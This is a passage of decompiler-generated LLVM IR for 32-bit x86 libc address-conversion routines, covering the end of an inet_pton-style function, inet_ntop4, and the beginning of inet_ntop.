  %v6_80538f5 = add i32 %v2_80538f1, %v4_80538d1
  store i32 %v6_80538f5, i32* %eax.global-to-local, align 4
  %v1_80538f9 = add i32 %v0_80538f9100, 1
  store i32 %v1_80538f9, i32* @esi, align 4
  %v1_80538fa = inttoptr i32 %v6_80538f5 to i8*
  %v2_80538fa = load i8, i8* %v1_80538fa, align 1
  %v3_80538fa = zext i8 %v2_80538fa to i32
  %v4_80538fa = load i32, i32* @edx, align 4
  %v5_80538fa = and i32 %v4_80538fa, -256
  %v6_80538fa = or i32 %v5_80538fa, %v3_80538fa
  store i32 %v6_80538fa, i32* @edx, align 4
  %v3_80538fc = inttoptr i32 %v2_80538f3 to i8*
  store i8 %v2_80538fa, i8* %v3_80538fc, align 1
  %v0_80538fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80538fe = inttoptr i32 %v0_80538fe to i8*
  store i8 0, i8* %v1_80538fe, align 1
  %v0_8053901.pre = load i32, i32* @esi, align 4
  %v1_8053901.pre = load i32, i32* @edi, align 4
  %v2_8053901 = inttoptr i32 %v0_8053901.pre to i8*
  %v3_8053901 = inttoptr i32 %v1_8053901.pre to i8*
  %v9_8053903 = icmp sgt i8* %v2_8053901, %v3_8053901
  br i1 %v9_8053903, label %dec_label_pc_8053909.thread, label %dec_label_pc_80538eb

dec_label_pc_8053909.thread:                      ; preds = %dec_label_pc_80538eb, %dec_label_pc_8053901.preheader
  br label %dec_label_pc_805390f

dec_label_pc_8053909:                             ; preds = %dec_label_pc_80538d1
  %v16_8053909 = icmp eq i32 %v0_8053909.pre, %v2_80537ba
  %v1_805390d = icmp eq i1 %v16_8053909, false
  br i1 %v1_805390d, label %dec_label_pc_805393a, label %dec_label_pc_805390f

dec_label_pc_805390f:                             ; preds = %dec_label_pc_8053909.thread, %dec_label_pc_8053909
  store i32 %v2_80537ae, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805391b = call i32 @memcpy(i16* %tmp64, i32 %v2_80537ae, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805393c

dec_label_pc_805392a:                             ; preds = %dec_label_pc_805378e
  %v1_805392a = call i32 @__errno_location(i32 %v0_805377d)
  %v1_805392f = inttoptr i32 %v1_805392a to i32*
  store i32 97, i32* %v1_805392f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805393c

dec_label_pc_805393a:                             ; preds = %dec_label_pc_805383b, %dec_label_pc_8053832, %dec_label_pc_80537f6, %dec_label_pc_805381d, %dec_label_pc_80538d8, %dec_label_pc_805387c, %dec_label_pc_8053909, %dec_label_pc_80538ba, %dec_label_pc_805386f, %dec_label_pc_8053866, %dec_label_pc_80537c9
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805393c

dec_label_pc_805393c:                             ; preds = %dec_label_pc_805392a, %dec_label_pc_805390f, %dec_label_pc_8053799, %dec_label_pc_805393a
  %v0_8053943 = phi i32 [ -1, %dec_label_pc_805392a ], [ 1, %dec_label_pc_805390f ], [ %v3_805379f, %dec_label_pc_8053799 ], [ 0, %dec_label_pc_805393a ]
  store i32 %v0_805377d, i32* @ebx, align 4
  store i32 %v0_805377c, i32* @esi, align 4
  store i32 %v0_805377b, i32* @edi, align 4
  store i32 %v0_805377a, i32* @ebp, align 4
  ret i32 %v0_8053943

; uselistorder directives
  uselistorder i32 %v1_8053901.pre, { 1, 0 }
  uselistorder i32 %v0_8053901.pre, { 1, 0 }
  uselistorder i32 %v0_80538f9100, { 2, 1, 0 }
  uselistorder i32 %v0_8053909.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8053909.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80538a1, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_80537ee, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_80537ba, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_805377d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805393c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805393a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805390f, { 1, 0 }
  uselistorder label %dec_label_pc_80538eb, { 1, 0 }
  uselistorder label %dec_label_pc_80538d1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805389a, { 1, 0 }
  uselistorder label %dec_label_pc_805385a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805389a.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8053945 = load i32, i32* @edi, align 4
  %v0_8053946 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_805394e = load i32, i32* @eax, align 4
  %v3_8053952 = and i32 %v0_805394e, -65536
  store i32 %v3_8053952, i32* %stack_var_-33, align 4
  %v2_805395d = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053963 = load i32, i32* @edx, align 4
  %v5_8053963 = inttoptr i32 %v0_8053963 to i8*
  store i8* %v5_8053963, i8** %stack_var_-60, align 4
  %v0_8053967 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_805396d = add i32 %v2_805395d, 4
  store i32 %v6_805396d, i32* %edi.global-to-local, align 4
  %v2_805396e = inttoptr i32 %v6_805396d to i32*
  store i32 0, i32* %v2_805396e, align 4
  %v3_805396e = load i32, i32* %edi.global-to-local, align 4
  %v6_805396e = add i32 %v3_805396e, 4
  store i32 %v6_805396e, i32* %edi.global-to-local, align 4
  %v0_805396f = load i32, i32* %eax.global-to-local, align 4
  %v2_805396f = inttoptr i32 %v6_805396e to i32*
  store i32 %v0_805396f, i32* %v2_805396f, align 4
  %v3_805396f = load i32, i32* %edi.global-to-local, align 4
  %v6_805396f = add i32 %v3_805396f, 4
  store i32 %v6_805396f, i32* %edi.global-to-local, align 4
  %v0_8053970 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053970 = trunc i32 %v0_8053970 to i16
  %v3_8053970 = inttoptr i32 %v6_805396f to i16*
  store i16 %v1_8053970, i16* %v3_8053970, align 2
  %v4_8053970 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053970 = add i32 %v4_8053970, 2
  store i32 %v7_8053970, i32* %edi.global-to-local, align 4
  %v0_8053972 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053972 = trunc i32 %v0_8053972 to i8
  %v3_8053972 = inttoptr i32 %v7_8053970 to i8*
  store i8 %v1_8053972, i8* %v3_8053972, align 1
  %v0_8053a0226 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8053a0529 = icmp sgt i32 %v0_8053a0226, 3
  br i1 %v7_8053a0529, label %dec_label_pc_8053a0b, label %dec_label_pc_8053978

dec_label_pc_8053978:                             ; preds = %entry, %dec_label_pc_80539e0
  %v0_8053a0230 = phi i32 [ %v0_8053a02, %dec_label_pc_80539e0 ], [ %v0_8053a0226, %entry ]
  %v0_805397c = load i32, i32* @ecx, align 4
  %v1_805397c = and i32 %v0_805397c, -256
  %v2_805397c = or i32 %v1_805397c, 100
  store i32 %v2_805397c, i32* %ecx.global-to-local, align 4
  %v2_805397e = add i32 %v0_8053a0230, %v0_805394e
  store i32 %v2_805397e, i32* %eax.global-to-local, align 4
  %v0_8053980 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053980 = add i32 %v0_8053980, 1
  store i32 %v1_8053980, i32* @esi, align 4
  store i32 %v0_8053980, i32* @edi, align 4
  %v1_8053989 = inttoptr i32 %v2_805397e to i8*
  %v2_8053989 = load i8, i8* %v1_8053989, align 1
  %v3_8053989 = zext i8 %v2_8053989 to i32
  %v4_8053989 = load i32, i32* @edx, align 4
  %v5_8053989 = and i32 %v4_8053989, -65536
  %v6_8053989 = or i32 %v5_8053989, %v3_8053989
  store i32 %v6_8053989, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8053989, 100
  %v6_805398f = zext i8 %div to i32
  %v4_8053991 = or i32 %v6_805398f, %v1_805397c
  store i32 %v4_8053991, i32* %ecx.global-to-local, align 4
  %v1_8053993 = or i32 %v4_8053991, 48
  store i32 %v1_8053993, i32* %eax.global-to-local, align 4
  %v1_8053996 = trunc i32 %v1_8053993 to i8
  %v2_8053996 = load i32, i32* @esp, align 4
  %v4_8053996 = add i32 %v0_8053980, 43
  %v5_8053996 = add i32 %v4_8053996, %v2_8053996
  %v6_8053996 = inttoptr i32 %v5_8053996 to i8*
  store i8 %v1_8053996, i8* %v6_8053996, align 1
  %v0_805399a = load i32, i32* %eax.global-to-local, align 4
  %v1_805399a = trunc i32 %v0_805399a to i8
  %v7_805399a = icmp eq i8 %v1_805399a, 48
  %v1_805399c = icmp eq i1 %v7_805399a, false
  %v0_80539c2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80539c2 = and i32 %v0_80539c2, -256
  %v2_80539c2 = or i32 %v1_80539c2, 10
  store i32 %v2_80539c2, i32* %ecx.global-to-local, align 4
  %v0_80539c4 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80539c4, i32* %eax.global-to-local, align 4
  %v3_80539c6 = trunc i32 %v0_80539c4 to i16
  %v5_80539c6 = udiv i16 %v3_80539c6, 10
  br i1 %v1_805399c, label %dec_label_pc_80539c2, label %dec_label_pc_805399e

dec_label_pc_805399e:                             ; preds = %dec_label_pc_8053978
  %v9_80539a2 = and i32 %v0_80539c4, -65536
  %tmp = urem i16 %v5_80539c6, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_80539af = zext i16 %div32 to i32
  %v11_80539af = or i32 %v7_80539af, %v9_80539a2
  store i32 %v11_80539af, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_80539af = zext i16 %tmp34 to i32
  %v1_80539b2 = or i32 %v12_80539af, 48
  %v8_80539b2 = trunc i32 %v1_80539b2 to i8
  store i32 %v1_80539b2, i32* %edx.global-to-local, align 4
  %v2_80539b5 = load i32, i32* @esp, align 4
  %v3_80539b5 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80539b5 = add i32 %v2_80539b5, 43
  %v5_80539b5 = add i32 %v4_80539b5, %v3_80539b5
  %v6_80539b5 = inttoptr i32 %v5_80539b5 to i8*
  store i8 %v8_80539b2, i8* %v6_80539b5, align 1
  %v0_80539b9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80539b9 = trunc i32 %v0_80539b9 to i8
  %v7_80539b9 = icmp eq i8 %v1_80539b9, 48
  br i1 %v7_80539b9, label %dec_label_pc_80539e0, label %dec_label_pc_80539be

dec_label_pc_80539be:                             ; preds = %dec_label_pc_805399e
  %v0_80539be = load i32, i32* @esi, align 4
  store i32 %v0_80539be, i32* @edi, align 4
  br label %dec_label_pc_80539e0

dec_label_pc_80539c2:                             ; preds = %dec_label_pc_8053978
  %tmp35 = urem i16 %v5_80539c6, 256
  %v3_80539c8 = and i32 %v0_80539c4, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_80539d3 = zext i16 %div33 to i32
  %v11_80539d3 = or i32 %v7_80539d3, %v3_80539c8
  store i32 %v11_80539d3, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_80539d3 = zext i16 %tmp36 to i32
  %v1_80539d6 = or i32 %v12_80539d3, 48
  %v8_80539d6 = trunc i32 %v1_80539d6 to i8
  store i32 %v1_80539d6, i32* %edx.global-to-local, align 4
  %v0_80539d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539d9 = add i32 %v0_80539d9, 2
  store i32 %v1_80539d9, i32* @edi, align 4
  %v2_80539dc = load i32, i32* @esp, align 4
  %v3_80539dc = load i32, i32* @esi, align 4
  %v4_80539dc = add i32 %v2_80539dc, 43
  %v5_80539dc = add i32 %v4_80539dc, %v3_80539dc
  %v6_80539dc = inttoptr i32 %v5_80539dc to i8*
  store i8 %v8_80539d6, i8* %v6_80539dc, align 1
  br label %dec_label_pc_80539e0

dec_label_pc_80539e0:                             ; preds = %dec_label_pc_805399e, %dec_label_pc_80539be, %dec_label_pc_80539c2
  store i32 %v2_805397e, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_80539e9 = load i32, i32* @edi, align 4
  %v1_80539e9 = add i32 %v0_80539e9, 2
  store i32 %v1_80539e9, i32* %ebx.global-to-local, align 4
  %v0_80539ec = load i32, i32* %ebp.global-to-local, align 4
  %v1_80539ec = add i32 %v0_80539ec, 1
  store i32 %v1_80539ec, i32* %ebp.global-to-local, align 4
  %v2_80539ed = load i8, i8* %v1_8053989, align 1
  %v3_80539ed = zext i8 %v2_80539ed to i32
  %v4_80539ed = load i32, i32* %eax.global-to-local, align 4
  %v5_80539ed = and i32 %v4_80539ed, -65536
  %v6_80539ed = or i32 %v5_80539ed, %v3_80539ed
  store i32 %v6_80539ed, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80539f3 = load i32, i32* @esp, align 4
  %v2_80539f3 = add i32 %v0_80539e9, 44
  %v3_80539f3 = add i32 %v2_80539f3, %v0_80539f3
  %v4_80539f3 = inttoptr i32 %v3_80539f3 to i8*
  store i8 46, i8* %v4_80539f3, align 1
  %v0_80539f8 = load i32, i32* @ecx, align 4
  %v1_80539f8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80539f8 = urem i32 %v1_80539f8, 65536
  %v3_80539f8 = load i32, i32* %edx.global-to-local, align 4
  %v4_80539f8 = mul i32 %v3_80539f8, 65536
  %v5_80539f8 = or i32 %v4_80539f8, %v2_80539f8
  %v6_80539f8 = urem i32 %v0_80539f8, 65536
  %v7_80539f8 = udiv i32 %v5_80539f8, %v6_80539f8
  %v8_80539f8 = urem i32 %v7_80539f8, 65536
  %v10_80539f8 = and i32 %v1_80539f8, -65536
  %v11_80539f8 = or i32 %v8_80539f8, %v10_80539f8
  store i32 %v11_80539f8, i32* %eax.global-to-local, align 4
  %v12_80539f8 = urem i32 %v5_80539f8, %v6_80539f8
  %v14_80539f8 = and i32 %v3_80539f8, -65536
  %v15_80539f8 = or i32 %v12_80539f8, %v14_80539f8
  %v1_80539fb = add i32 %v15_80539f8, 48
  %v8_80539fb = trunc i32 %v1_80539fb to i8
  store i32 %v1_80539fb, i32* @edx, align 4
  %v2_80539fe = load i32, i32* @esp, align 4
  %v3_80539fe = load i32, i32* @edi, align 4
  %v4_80539fe = add i32 %v2_80539fe, 43
  %v5_80539fe = add i32 %v4_80539fe, %v3_80539fe
  %v6_80539fe = inttoptr i32 %v5_80539fe to i8*
  store i8 %v8_80539fb, i8* %v6_80539fe, align 1
  %v0_8053a02 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8053a05 = icmp sgt i32 %v0_8053a02, 3
  br i1 %v7_8053a05, label %dec_label_pc_8053a0b, label %dec_label_pc_8053978

dec_label_pc_8053a0b:                             ; preds = %dec_label_pc_80539e0, %entry
  %v0_8053a0b = load i32, i32* @esp, align 4
  %v1_8053a0b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053a0b = add i32 %v0_8053a0b, 42
  %v3_8053a0b = add i32 %v2_8053a0b, %v1_8053a0b
  %v4_8053a0b = inttoptr i32 %v3_8053a0b to i8*
  store i8 0, i8* %v4_8053a0b, align 1
  %v2_8053a13 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8053a13, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_8053a18 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_8053a18, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_8053a18, %v0_8053967
  br i1 %tmp31, label %dec_label_pc_8053a26, label %dec_label_pc_8053a35

dec_label_pc_8053a26:                             ; preds = %dec_label_pc_8053a0b
  %v0_8053a26 = load i8*, i8** %stack_var_-92, align 4
  %v1_8053a26 = ptrtoint i8* %v0_8053a26 to i32
  %v2_8053a26 = call i32 @__errno_location(i32 %v1_8053a26)
  %v1_8053a2b = inttoptr i32 %v2_8053a26 to i32*
  store i32 28, i32* %v1_8053a2b, align 4
  br label %dec_label_pc_8053a44

dec_label_pc_8053a35:                             ; preds = %dec_label_pc_8053a0b
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_8053a385 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8053a385, i32* %tmp25, align 4
  %v0_8053a3c.cast = inttoptr i32 %v3_8053a385 to i8*
  %v4_8053a3c = call i32 @strcpy(i8* %v0_8053a3c.cast, i32 %v2_8053a13)
  br label %dec_label_pc_8053a44

dec_label_pc_8053a44:                             ; preds = %dec_label_pc_8053a26, %dec_label_pc_8053a35
  %storemerge = phi i32 [ %v4_8053a3c, %dec_label_pc_8053a35 ], [ 0, %dec_label_pc_8053a26 ]
  %v0_8053a4b = phi i32 [ %v4_8053a3c, %dec_label_pc_8053a35 ], [ 0, %dec_label_pc_8053a26 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053946, i32* @esi, align 4
  store i32 %v0_8053945, i32* @edi, align 4
  ret i32 %v0_8053a4b

; uselistorder directives
  uselistorder i32 %v0_8053a02, { 1, 0 }
  uselistorder i32 %v3_80539f8, { 1, 0 }
  uselistorder i32 %v1_80539f8, { 1, 0 }
  uselistorder i32 %v1_80539d6, { 1, 0 }
  uselistorder i32 %v1_80539b2, { 1, 0 }
  uselistorder i32 %v0_80539c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8053993, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i8 100, { 2, 0, 1 }
  uselistorder i32 100, { 6, 0, 4, 5, 1, 2, 3 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 10, 12, 2, 8, 9, 11 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_8053a44, { 1, 0 }
  uselistorder label %dec_label_pc_80539e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053978, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8053a4d = load i32, i32* @edi, align 4
  %v0_8053a4e = load i32, i32* @esi, align 4
  %v0_8053a4f = load i32, i32* @ebx, align 4
  %v15_8053a50 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8053a57 = icmp eq i32 %arg1, 2
  br i1 %v9_8053a57, label %dec_label_pc_8053a67, label %dec_label_pc_8053a5c

dec_label_pc_8053a5c:                             ; preds = %entry
  %v9_8053a5c = icmp eq i32 %arg1, 10
  %v1_8053a5f = icmp eq i1 %v9_8053a5c, false
  br i1 %v1_8053a5f, label %dec_label_pc_8053c03, label %dec_label_pc_8053a7f

dec_label_pc_8053a67:                             ; preds = %entry
  %v4_8053a67 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8053a67, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8053a73 = call i32 @inet_ntop4(i32 %v0_8053a4f, i32 %v0_8053a4e, i32 %v0_8053a4d)
  store i32 %v3_8053a73, i32* %eax.global-to-local, align 4
  store i32 %v3_8053a73, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c10

dec_label_pc_8053a7f:                             ; preds = %dec_label_pc_8053a5c
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8053a84 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8053a84, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8053a89 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8053a89, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8053aab = add i32 %arg2, 1
  br label %dec_label_pc_8053a95

dec_label_pc_8053a95:                             ; preds = %dec_label_pc_8053a95.dec_label_pc_8053a95_crit_edge, %dec_label_pc_8053a7f
  %v1_8053ab8 = phi i32 [ %v15_8053a50, %dec_label_pc_8053a7f ], [ %v1_8053ab8.pre, %dec_label_pc_8053a95.dec_label_pc_8053a95_crit_edge ]
  %v0_8053ab372 = phi i32 [ 0, %dec_label_pc_8053a7f ], [ %v0_8053abc.pre, %dec_label_pc_8053a95.dec_label_pc_8053a95_crit_edge ]
  %v1_8053a9e = ashr i32 %v0_8053ab372, 31
  %v2_8053a9f = zext i32 %v0_8053ab372 to i64
  %v4_8053a9f = zext i32 %v1_8053a9e to i64
  %v5_8053a9f = mul nuw i64 %v4_8053a9f, 4294967296
  %v6_8053a9f = or i64 %v5_8053a9f, %v2_8053a9f
  %v8_8053a9f = sdiv i64 %v6_8053a9f, 2
  %v9_8053a9f = trunc i64 %v8_8053a9f to i32
  store i32 %v9_8053a9f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8053a9f, i32* %ebx.global-to-local, align 4
  %v2_8053aa7 = add i32 %v0_8053ab372, %arg2
  %v3_8053aa7 = inttoptr i32 %v2_8053aa7 to i8*
  %v4_8053aa7 = load i8, i8* %v3_8053aa7, align 1
  %v5_8053aa7 = zext i8 %v4_8053aa7 to i32
  store i32 %v5_8053aa7, i32* %eax.global-to-local, align 4
  %v3_8053aab = add i32 %v2_8053aab, %v0_8053ab372
  %v4_8053aab = inttoptr i32 %v3_8053aab to i8*
  %v5_8053aab = load i8, i8* %v4_8053aab, align 1
  %v6_8053aab = zext i8 %v5_8053aab to i32
  store i32 %v6_8053aab, i32* %edx.global-to-local, align 4
  %v2_8053ab0 = mul nuw nsw i32 %v5_8053aa7, 256
  %v1_8053ab3 = add i32 %v0_8053ab372, 2
  store i32 %v1_8053ab3, i32* %ecx.global-to-local, align 4
  %v2_8053ab6 = or i32 %v6_8053aab, %v2_8053ab0
  store i32 %v2_8053ab6, i32* %eax.global-to-local, align 4
  %v3_8053ab8 = mul i32 %v9_8053a9f, 4
  %v4_8053ab8 = add i32 %v3_8053ab8, 60
  %v5_8053ab8 = add i32 %v4_8053ab8, %v1_8053ab8
  %v6_8053ab8 = inttoptr i32 %v5_8053ab8 to i32*
  store i32 %v2_8053ab6, i32* %v6_8053ab8, align 4
  %v0_8053abc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8053abf = icmp sgt i32 %v0_8053abc.pre, 15
  br i1 %v7_8053abf, label %dec_label_pc_8053ac1, label %dec_label_pc_8053a95.dec_label_pc_8053a95_crit_edge

dec_label_pc_8053a95.dec_label_pc_8053a95_crit_edge: ; preds = %dec_label_pc_8053a95
  %v1_8053ab8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053a95

dec_label_pc_8053ac1:                             ; preds = %dec_label_pc_8053a95
  %v4_8053a7f = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053acb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053acb

dec_label_pc_8053acb:                             ; preds = %dec_label_pc_8053ac1, %dec_label_pc_8053af8
  %v0_8053af871 = phi i32 [ 0, %dec_label_pc_8053ac1 ], [ %v1_8053af8, %dec_label_pc_8053af8 ]
  %v0_8053ae370 = phi i32 [ -1, %dec_label_pc_8053ac1 ], [ %v0_8053ae38, %dec_label_pc_8053af8 ]
  %v0_8053b0369 = phi i32 [ -1, %dec_label_pc_8053ac1 ], [ %v0_8053ae89, %dec_label_pc_8053af8 ]
  %v0_8053b0e68 = phi i32 [ -1, %dec_label_pc_8053ac1 ], [ %v0_8053af313, %dec_label_pc_8053af8 ]
  %v2_8053acb = mul nuw nsw i32 %v0_8053af871, 4
  %v3_8053acb = add nuw nsw i32 %v2_8053acb, 60
  %v4_8053acb = add i32 %v3_8053acb, %v0_8053acb.pre
  %v5_8053acb = inttoptr i32 %v4_8053acb to i32*
  %v6_8053acb = load i32, i32* %v5_8053acb, align 4
  %v7_8053acb = icmp eq i32 %v6_8053acb, 0
  %v1_8053ad0 = icmp eq i1 %v7_8053acb, false
  %v10_8053ae3 = icmp eq i32 %v0_8053ae370, -1
  br i1 %v1_8053ad0, label %dec_label_pc_8053ae3, label %dec_label_pc_8053ad2

dec_label_pc_8053ad2:                             ; preds = %dec_label_pc_8053acb
  %v1_8053ad5 = icmp eq i1 %v10_8053ae3, false
  br i1 %v1_8053ad5, label %dec_label_pc_8053ae0, label %dec_label_pc_8053ad7

dec_label_pc_8053ad7:                             ; preds = %dec_label_pc_8053ad2
  store i32 %v0_8053af871, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053af8

dec_label_pc_8053ae0:                             ; preds = %dec_label_pc_8053ad2
  %v0_8053ae0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ae0 = add i32 %v0_8053ae0, 1
  store i32 %v1_8053ae0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053af8

dec_label_pc_8053ae3:                             ; preds = %dec_label_pc_8053acb
  br i1 %v10_8053ae3, label %dec_label_pc_8053af8, label %dec_label_pc_8053ae8

dec_label_pc_8053ae8:                             ; preds = %dec_label_pc_8053ae3
  %v10_8053ae8 = icmp eq i32 %v0_8053b0369, -1
  %v0_8053af1.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053aed = load i32, i32* @ebp, align 4
  %v7_8053aef = icmp sgt i32 %v0_8053af1.pre, %v1_8053aed
  %or.cond = or i1 %v10_8053ae8, %v7_8053aef
  br i1 %or.cond, label %dec_label_pc_8053af1, label %dec_label_pc_8053af5

dec_label_pc_8053af1:                             ; preds = %dec_label_pc_8053ae8
  store i32 %v0_8053af1.pre, i32* @ebp, align 4
  store i32 %v0_8053b0e68, i32* @edi, align 4
  br label %dec_label_pc_8053af5

dec_label_pc_8053af5:                             ; preds = %dec_label_pc_8053ae8, %dec_label_pc_8053af1
  %v0_8053ae811 = phi i32 [ %v0_8053b0e68, %dec_label_pc_8053af1 ], [ %v0_8053b0369, %dec_label_pc_8053ae8 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053af8

dec_label_pc_8053af8:                             ; preds = %dec_label_pc_8053ae3, %dec_label_pc_8053ae0, %dec_label_pc_8053ad7, %dec_label_pc_8053af5
  %v0_8053af313 = phi i32 [ %v0_8053b0e68, %dec_label_pc_8053ae3 ], [ %v0_8053b0e68, %dec_label_pc_8053ae0 ], [ %v0_8053af871, %dec_label_pc_8053ad7 ], [ -1, %dec_label_pc_8053af5 ]
